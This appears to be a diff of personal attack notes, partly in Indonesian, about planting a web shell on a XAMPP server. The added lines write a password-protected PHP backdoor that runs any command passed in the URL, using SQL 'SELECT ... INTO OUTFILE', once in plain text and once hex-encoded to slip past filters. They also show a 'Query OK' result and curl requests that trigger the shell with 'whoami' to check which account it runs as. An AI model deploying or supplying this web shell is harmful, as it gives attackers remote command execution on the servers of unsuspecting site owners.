@@ -9,6 +9,23 @@ https://www.dummy.co.id/Web_Sci/assets.php?cmd=whoami
 pake sandi
 SELECT '<?php if($_GET["pass"]=="Codex") system($_GET["cmd"]); ?>' INTO OUTFILE 'D:/xampp/htdocs/Web_Sci/assets.php';
 
+curl -s "https://dummy.co.id/assets.php?pass=Codex&cmd=whoami"
+
+<?php if($_GET['pass']=='Codex'){$a=array($_GET['cmd']);array_filter($a,'system');}?>
+
+
+
+SELECT 0x3c3f70687020696628245f4745545b2770617373275d3d3d27436f646578272d3e70617373297b24613d617272617928245f4745545b27636d64275d293b61727261795f66696c7465722824612c2773797374656d27293b7d3f3e INTO OUTFILE 'D:/xampp/htdocs/Web_Sci/assets.php';
+
+
+Query OK, 1 row affected (0.001 sec)
+
+
+curl -I "https://dummy.co.id/Web_Sci/assets.php"
+curl -s "https://dummy.co.id/Web_Sci/assets.php?pass=Codex&cmd=whoami"
+
+
+
 https://www.dummy.co.id/Web_Sci/assets.php?pass=Codex&cmd=whoami
 
 NANTI DI LIAT SAAT SUDAH WHO AMI APAKAH RAKYAT BIASA ATAU SYSTEM?ADMINISTATOR
